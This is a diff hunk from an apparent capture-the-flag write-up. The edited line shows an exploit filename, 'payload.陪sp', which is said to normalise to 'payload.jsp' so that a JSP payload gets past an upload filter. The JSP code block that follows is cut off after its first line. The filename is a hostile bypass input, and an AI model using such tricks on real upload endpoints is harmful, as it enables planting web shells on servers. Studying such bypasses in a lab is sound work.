@@ -6,7 +6,7 @@ Then, combined with the title of this challenge, we can know that the key to sol
 
 EXP:
 
-filename：payload.陪 sp --> payload.jsp
+filename：payload.陪sp --> payload.jsp
 
 ```java
 <%@ page import="java.io.*" %>
